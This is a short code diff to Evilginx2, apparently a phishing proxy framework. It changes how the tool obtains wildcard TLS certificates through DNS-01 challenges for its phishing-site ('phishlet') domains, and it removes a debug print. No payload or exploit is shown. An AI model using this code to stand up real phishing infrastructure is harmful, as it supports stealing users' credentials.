@@ -1,7 +1,6 @@
 package core
 
 import (
-	"strings"
 	"crypto"
 	"crypto/rand"
 	"crypto/rsa"
@@ -39,7 +38,6 @@ func NewEvilginx2DNSProvider(ns *Nameserver) (*Evilginx2DNSProvider, error) {
 
 func (d *Evilginx2DNSProvider) Present(domain, token, keyAuth string) error {
     fqdn, value := dns01.GetRecord(domain, keyAuth)
-    fmt.Printf("Setting DNS for %v to %v", fqdn, value)
     d.ns.AddTXT(fqdn, value, 60)
     return nil
 }
@@ -239,8 +237,7 @@ func (d *CertDb) obtainHostnameCertificate(hostname string) error {
 	}
 	crt_dir := filepath.Join(d.dataDir, HOSTS_DIR)
 	// Always request a wildcard hostname too
-	hostnamePrefix := hostname[strings.Index(hostname, "."):]
-	domains := []string{hostnamePrefix, "*." + hostnamePrefix}
+	domains := []string{hostname, "*." + hostname}
 	cert_res, err := d.registerCertificate(domains)
 	if err != nil {
 		return err
@@ -318,11 +315,8 @@ func (d *CertDb) obtainPhishletCertificate(site_name string, base_domain string,
 	}
 	crt_dir := filepath.Join(d.dataDir, base_domain)
 
-	// Make sure we get a certificate for the base domain
-	domain_prefix := base_domain[strings.Index(base_domain, ".")+1:]
-	log.Info("Hostname: %v, Hostname prefix: %v", base_domain, domain_prefix)
-
-	cert_res, err := d.registerCertificate([]string{domain_prefix, "*." + domain_prefix})
+	// Get wildcard certificate
+	cert_res, err := d.registerCertificate([]string{base_domain, "*." + base_domain})
 	if err != nil {
 		return err
 	}
